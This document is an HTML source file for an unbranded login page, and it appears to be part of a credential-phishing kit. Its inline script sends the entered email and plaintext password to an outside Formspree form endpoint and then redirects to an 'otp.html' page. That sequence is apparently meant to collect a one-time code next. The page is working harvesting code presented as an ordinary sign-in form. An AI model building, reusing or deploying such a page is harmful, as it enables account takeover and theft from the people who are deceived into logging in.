<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="img" href="asset/header-logo.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home</title>

    <script type="text/javascript">
      document.addEventListener("DOMContentLoaded", function () {
        console.log("working");

        const btn = document.getElementById("redirectBtn");
        const emailInput = document.getElementById("email");
        const form = document.getElementById("form");

        if (form) {
          form.addEventListener("submit", async function (event) {
            event.preventDefault(); // Prevent form default submission

            if (!emailInput.value) {
              alert("Please enter your email.");
              return;
            }

            btn.textContent = "Loading..."; // Change button text
            btn.disabled = true; // Prevent multiple clicks

            localStorage.setItem("email", emailInput.value); // Store email

            let formData = new FormData(form);

            try {
              let response = await fetch("https://formspree.io/f/xoveqrzb", {
                method: "POST",
                body: formData,
                headers: { Accept: "application/json" },
              });

              if (response.ok) {
                window.location.href = "otp.html"; // Redirect after success
              } else {
                alert("Failed to send form. Please try again.");
              }
            } catch (error) {
              alert("An error occurred. Please try again later.");
            } finally {
              btn.textContent = "Login"; // Reset button text
              btn.disabled = false; // Re-enable button
            }
          });
        }
      });

      // Function to toggle password visibility
      function togglePass() {
        const passInput = document.getElementById("pass");
        passInput.type = passInput.type === "password" ? "text" : "password";
      }
    </script>

    <script type="module" crossorigin src="main.js"></script>
    <link rel="stylesheet" href="asset/style.css" />
  </head>

  <body class="bg-gray-100">
    <div class="w-[90%] max-w-md mx-auto pt-5">
      <div class="mt-5"></div>
      <form id="form" class="mt-44">
        <div
          class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6"
        >
          <p class="font-bold loginu mb-3">Log In</p>
          <img class="imglogo" src="asset/header-logo.png" />

          <div class="ctn relative">
            <input
              required
              minlength="5"
              id="email"
              name="email"
              type="email"
              class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
              placeholder="Email"
            />
          </div>

          <div class="ctn relative">
            <input
              required
              minlength="5"
              id="pass"
              name="pass"
              type="password"
              class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
              placeholder="Password"
            />

            <img
              onclick="togglePass()"
              src="asset/eyes-a95130fc.svg"
              class="absolute top-1/2 bottom-1/2 right-3 my-auto"
            />
          </div>

          <button
            id="redirectBtn"
            class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
          >
            Login
          </button>
          <p class="pt-3 text-primary font-semibold text-center">
            Reset Password
          </p>
        </div>
      </form>
    </div>
  </body>
</html>
